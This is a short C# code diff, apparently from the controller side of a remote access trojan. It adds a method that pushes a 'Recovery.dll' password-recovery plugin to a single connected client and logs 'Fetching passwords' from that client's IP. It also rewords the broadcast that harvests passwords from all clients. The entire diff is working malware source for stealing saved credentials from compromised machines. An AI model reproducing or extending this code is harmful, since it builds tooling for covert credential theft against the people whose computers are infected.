@@ -28,12 +28,22 @@ namespace Server.Forms
         {
             ViewAll();
         }
+        public void ViewClient(Clients cl)
+        {
+            listViewClients.Clear();
+            listViewPasswords.Items.Clear();
+            listViewPasswords.Groups.Clear();
 
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+            string dllstr = GetHash.GetChecksum(@"Plugins\Recovery.dll");
+            msgpack.ForcePathObject("Dll").AsString = dllstr;
+
+            ThreadPool.QueueUserWorkItem(cl.Send, msgpack.Encode2Bytes());
+            new HandleLogs().Addmsg($"Fetching passwords From {cl.Ip}...", Color.Black);
+        }
         public void ViewAll()
         {
-            Form1 formmain = (Form1)Application.OpenForms["MainForm"];
-            if (formmain == null) return;
-
             listViewClients.Clear();
             listViewPasswords.Items.Clear();
             listViewPasswords.Groups.Clear();
@@ -45,8 +55,9 @@ namespace Server.Forms
 
             foreach (Clients client in Settings.GetAllClients())
                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-            new HandleLogs().Addmsg("Recovering...", Color.Black);
+            new HandleLogs().Addmsg("Fetching all passwords...", Color.Black);
         }
+
         private void ShowClient(string hwid, string ip, string txtfilter = null,
             bool nameflag = false, bool passflag = false, bool urlflag = true)
         {
